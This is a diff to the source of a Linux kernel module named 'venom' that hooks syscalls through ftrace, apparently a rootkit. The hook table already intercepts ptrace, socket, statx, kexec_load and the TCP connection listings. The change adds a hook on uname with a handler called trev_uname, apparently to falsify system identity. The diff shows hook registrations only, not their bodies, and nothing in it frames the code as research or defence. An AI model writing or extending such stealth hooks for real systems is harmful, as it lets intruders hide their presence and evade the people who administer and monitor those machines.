@@ -19,7 +19,9 @@
 #include "hooks/kexec_load.h"
 #include "hooks/socket.h"
 #include "hooks/statx.h" 
-#include "hooks/ptrace.h"  
+#include "hooks/ptrace.h" 
+#include "hooks/uname.h"  
+
 
 
 MODULE_LICENSE("GPL");
@@ -85,6 +87,7 @@ static struct ftrace_hook all_hooks[] = {
     HOOK("__x64_sys_socket", hooked_socket, &orig_socket),
     HOOK("__x64_sys_setsockopt", hooked_setsockopt, &orig_setsockopt), 
     HOOK("__x64_sys_ptrace", hooked_ptrace, &orig_ptrace), 
+    HOOK("__x64_sys_uname", trev_uname, &orig_uname), 
 
     HOOK("tcp4_seq_show", hooked_tcp4_seq_show, &orig_tcp4_seq_show),
     HOOK("tcp6_seq_show", hooked_tcp6_seq_show, &orig_tcp6_seq_show),
@@ -156,5 +159,6 @@ notrace static void __exit venom_exit(void) {
 
 module_init(venom_init);
 module_exit(venom_exit); 
+
 
 
